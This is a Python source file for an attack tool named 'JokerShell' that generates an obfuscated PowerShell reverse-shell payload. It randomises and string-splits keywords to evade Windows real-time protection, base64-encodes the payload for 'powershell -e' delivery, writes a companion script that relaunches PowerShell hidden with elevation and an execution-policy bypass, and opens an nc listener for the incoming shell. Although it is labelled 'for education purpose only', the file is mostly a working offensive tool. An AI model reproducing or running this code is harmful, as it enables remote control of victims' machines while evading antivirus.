import random
import time
import uuid
import base64
import argparse
import logging
import subprocess
from tqdm import tqdm
from colorama import init, Fore
init(autoreset=True)

# - This tool is an obfuscated PowerShell payload designed to bypass RTP
# - and allow for RCE on a victim's machine. It opens a listener on a specified
# - port and waits for the victim to run it. The payload is created by replacing specific strings
# - with randomly generated similar-looking strings to avoid detection
# - The tool also provides a base64-encoded version of the payload that can be copied and run on the victim's machine.
# - The tool's use requires knowledge of PowerShell and the ability to execute commands on the victim's machine.
# - Made by Adkali
# - For education purpose only

# SET THE BASIC CONFING FOR LOGGING
logging.basicConfig(level=logging.INFO)
# CREATE A LOGGER WITH __NAME__ FOR THE CURRENT MODULE
logger = logging.getLogger(__name__)

# ---------------------  DEFINING COLORS ---------------------
def Pro_Colors():
    yellow = Fore.YELLOW
    red = Fore.RED
    normal = Fore.RESET
    cyan = Fore.CYAN
    lightblue = Fore.LIGHTBLUE_EX
    green = Fore.GREEN
    return yellow, red, normal, cyan, lightblue, green

# Assign Colors To Names, Call Them After.
Yellow, Red, Normal, l_cyan, LightBlue, Green = Pro_Colors()

MAIN = "├──"
TEE2 = "└──"
SPACE_PREFIX = "   "

# Generate a list of 10 UUIDs to be randomly given when code runs
random_uuid = []
for uid in range(10):
    random_uuid.append("$" + str(uuid.uuid4()))
random_uid_get = random.choice(random_uuid)
print(f"\nRandomly UUID => {random_uid_get}"), time.sleep(0.7)
split_uuid = random_uid_get.split("-")[0]

def JOKER():
    print(f'''
.------..------..------..------..------.
|{Yellow}P{Normal}.--. ||O.--. ||W.--. ||E.--. ||R.--. |
| :(): || :/\: || :/\: || (\/) || :(): |
| ()() || :\/: || :\/: || :\/: || ()() |
| '--'J|| '--'O|| '--'K|| '--'E|| '--'R|
`------'`------'`------'`------'`------''')


# -------------- USING PARSER LIBRARY --------------
parser = argparse.ArgumentParser(description="Why so serious?")
parser.add_argument('-l', '-local', type=str, required=True, help='Local Machine')
parser.add_argument('-p', '-port', type=int, default=None, help='On What Port To Connect')
parser.add_argument('-r', '-raw', choices=["raw"], required=False, help="Raw Output")
args = parser.parse_args()

if not args.p:
    print(f"\n[!] {Fore.RED}\033[1mNote:{Fore.RESET} Default port is 4444.")
    args.p = 4444
time.sleep(0.5)

# Words To Check For
def Bomb():
    try:
        logger.info(f"\n{Red}{MAIN}{Normal} Calculating Strings...")
        with open('Payload.ps1', 'r') as file:
            spl = file.read()
            words_to_check = ["SYSTEMROOT", "New-Object", "GetStream", "ASCII", "System.Net.Sockets", "$client", "$sendback", "$data"]
            word_to_update = [repl, repl3, repl5, repl6, repl4, repl7, repl8, repl9]
            num_words_to_check = len(words_to_check)
            time.sleep(1)
            print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}Checks For Replaceable Words....")
            time.sleep(0.5)
            with tqdm(total=num_words_to_check, bar_format="{l_bar}{bar}{r_bar}", colour='YELLOW') as pbar:
                for i, word in enumerate(words_to_check):
                    pbar.update(1)
                    time.sleep(0.001)
                    if word not in spl:
                        pbar.write(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{i+1}. {word} - {Yellow}Replaced{Normal} -->> {word_to_update[i]}")
                    time.sleep(1)
        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{LightBlue}{Normal}Just A Second...")
        time.sleep(1.5)
        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{l_cyan}{TEE2}{Normal}Payload Generated...... ↓\n")
        time.sleep(1.5)

    except Exception as e:
        logger.error(e)


# ------------ DMV GDE PDE GTG --------------------
Command1 = ['$a = IEX $env:', 'SystemRoot\SysWow64\??ndowsPowerShe??', '\\v1.0\powershe??.exe;']
Command2 = ['$client = New-Object ', 'System.Net.Sockets.', 'TCPClient("0.0.0.0",0000)']
Command3 = ['$stream = ', '$client.GetStream();', '[byte[]]$bytes = 0..65535|%{0};']
Command4 = ['while(($i = $stream.Read($bytes, 0, $bytes.Length))',
'-ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']
Command5 = ['$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']

# --------------------- WORDS TO GET-OFF --------------------- #
# S//Y//S//T//E//M//R//O//O//T
WordCharSystem1 = ["SysTemROot", "Syste?????", "Syst??r??t", "SyS?em?oo?"
                   "SYSTEmRoot", "Sys???r???"
                   ]

# S//y//s//t//e//m//3//2
WordCharSystem2 = ["SysWoW??", "SYSW?W6?", "SySwO???", "SYSW????"
                   ]

# N//e//w//O//b//j//e//c//t
WordCharSystem3 = ["Ne''w-O''bje''ct", "N''ew-O''bj''ec''t", "N'e'W'-'o'B'J'e'C'T'",
                   "&('N'+'e'+'w'+'-'+'O'+'b'+'J'+'e'+'c'+'t')", "NeW-oB''JeCT", "&('New'+'-ObJect')",
                   "&('N'+'e'+'w'+'-ObJect')", "&('New'+'-'+'Ob'+'je'+'ct')", "&('Ne+'w'+'-'+'Ob'+'je'+'ct')"
                   ]

# S//y//s//t//e//m//.//N//e//t//.//S//o//c//k//e//t//s
WordCharSystem4 = ["Sy''st''em.Net.Soc''kets.TcPClIeNt", "SyS''tEm.Net.SoC''kE''tS.TCPCLIENT",
                   "Sy''St''Em.NeT.So''CkE''tS.TCpCLient", "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')",
                   "('S'+ 'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPcliEnt')"
                   ]

# G//e//t//S//t//r//e//a//m
WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'S'+'T'+'r'+'e'+'am')",
                   "('gEt'+'s'+'T'+'r'+'E'+'aM')", "('G'+'e'+'tStream')"
                   ]

# S//y//s//t//e//m//T//e//x//t//.//A//S//C//I//I//E//n//c//o//d//i//n//g
WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding",
                   "S'y's't'e'm.T'e'x't.'A'S'C'I'IE'n'c'o'd'i'n'g"
                   ]

WordCharSystem7 = ["$41b394758330c8=$3757856aa482c79977", "$37f=$91a10810c37a0f=$946c88e=$ecf0bb86",
                   "$b=$c=$9=$5=$d=$f=$c=$1=$4=$1=$4=$6=$a=$a=$2=$3=$e=$4=$3=$f=$2=$e=$a=$7=$a=$f=$0=$4=$d=$3=$1=$0",
                   "$e=$7=$f=$c=$f=$8=$e=$4=$9=$e=$3=$9=$a=$f=$3=$c=$f=$6=$a=$f=$2=$4=$6=$f=$d=$c=$f=$5=$3=$5=$d=$f",
                   ]

WordCharSystem8 = ["$3dbfe2ebffe072727949d7cecc51573b", "$b15ff490cfd2aa65358d2e5e376c5dd2",
                   "$b91ae5f2a05e87e53ef4ca58305c600f", "$fb3c97733989bd69eede22507aab10df"
                   ]

WordCharSystem9 = split_uuid

# --------------------- Join List Together --------------------- #
C1 = ''.join(Command1).strip()
C2 = ''.join(Command2).strip()
C3 = ''.join(Command3).strip()
C4 = ''.join(Command4).strip()
C5 = ''.join(Command5).strip()
W = ', '.join(WordCharSystem1)
W2 = ', '.join(WordCharSystem2)
w3 = '. '.join(WordCharSystem3)

# --------------------- REPLACING --------------------- #
if "SYSTEMROOT" or "SystemRoot" in C1:
    repl = random.choice(WordCharSystem1)
if "SysWow64" in C1:
    repl2 = random.choice(WordCharSystem2)
if "New-Object" in C2:
    repl3 = random.choice(WordCharSystem3)
if "System.Net.Sockets" in C2:
    repl4 = random.choice(WordCharSystem4)
if "GetStream" in C3:
    repl5 = random.choice(WordCharSystem5)
if "System.Text.ASCIIEncoding" in C4:
    repl6 = random.choice(WordCharSystem6)

# --------------------- MAIN CODE ---------------------
privilege = '''
param([switch]$Elevated)

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    Unblock-File '.\Privilege.ps1'
}

if ((Test-Admin) -eq $false)  {
    if ($elevated) {
        # tried to elevate, did not work, aborting
    } else {
        Start-Process $env:''' + f'''{repl}\\''' + f'''\\{repl2}'''+'''\\??ndowsPowerShe??\\v1.0\powershe??.exe -Verb RunAs -ArgumentList ('-noprofile -WindowStyle hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }
    exit
}

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
$encodedCommand = 'BASE64_ENCODED_COMMAND_HERE'
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
'''

# --------------------- CONTINUE MAIN CODE BLOCK ---------------------
def Execute_privilege():
    with open('Privilege.ps1', 'w') as run:
        run.write(f'{privilege}')
    run.close()

def Execute_Payload():
    with open('Payload.ps1', 'w') as run2:
        run2.write(f";$client = {repl3} {repl4}('{args.l}',{args.p});\n")
        run2.write(f"$StReAm = $client.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};\n")
        run2.write(f"while(($i = $StREaM.ReAd($bytes, 0, $bytes.LeNgTh)) -ne 0)" + "{;\n")
        run2.write(f"$data = ({repl3} -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);\n")
        run2.write(f'''$sendback = (iex ". {{  $data  }} 2>&1" | Ou''t-Str''ing );\n''')
        run2.write(f"$J=$O=$K=$E=$R=$P=$W=$R = ${{sendback}} + '{LightBlue}JokerShell{Normal} ' + (pwd).Path + '> ';\n")
        run2.write("$s = ('{0}{1}{2}{3}'-f 't','e','x','t'); $sendbyte = ([text.encoding]::ASCii).GetBYTeS($R);\n")
        run2.write("$stREaM.Write($sendbyte,0,$seNdByte.Length);$sTREaM.Flush()};$client.Close()\n")
    run2.close()
    time.sleep(1)

repl7 = None
repl8 = None
repl9 = None
def Change_Payload(x):
    global repl7, repl8, repl9
    # Make Random MD5 Value Variables
    repl7 = random.choice(WordCharSystem7)
    repl8 = random.choice(WordCharSystem8)
    repl9 = WordCharSystem9
    with open(x, "r") as file:
        file_content = file.read()
    file_content = file_content.replace("$client", repl7)
    file_content = file_content.replace("$sendback", repl8)
    file_content = file_content.replace("sendback", repl8.split("$")[1])
    file_content = file_content.replace("$data", repl9)
    with open(x, 'w') as file:
        file.write(file_content)
    file.close()

def Raw_Payload(x):
    with open(x, "r") as f:
        file = f.read()
        print(file)

# -------------------------------- ENCODE TO BASE64 WHEN FINISH ------------------------------#
 #                                                                                             #
  #                                                                                             #
   # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

def B64(FTD):
    with open(FTD, 'rb') as file:
        file_content = file.read()
    return base64.b64encode(file_content).decode('utf-8')

def main():
    Execute_privilege()
    Execute_Payload()
    Change_Payload("Payload.ps1")
    JOKER()
    Bomb()
    FP = 'Payload.ps1'
    B64(FTD=FP)
    time.sleep(0.5)
    print(f"[+] {Yellow}TIP{Normal}: use as: powershell -w hidden -EncodedCommand [PAYLOAD]")
    print("PAYLOAD -> Copy and run:\n")
    base64_payload = subprocess.Popen('iconv -f ASCII -t UTF-16LE Payload.ps1 | base64 -w 0', shell=True, stdout=subprocess.PIPE)
    base_bytes = base64_payload.communicate()[0]
    if args.r == "raw":
        Raw_Payload(x=FP)
    else:
        print(f"powershell -e {base_bytes.decode('utf-8')}")
    time.sleep(0.5)
    subprocess.Popen('rm -r Payload.ps1', shell=True)
    process = subprocess.Popen(['nc', '-lvnp', f'{args.p}'])
    process.wait()

if __name__ == '__main__':
    main()
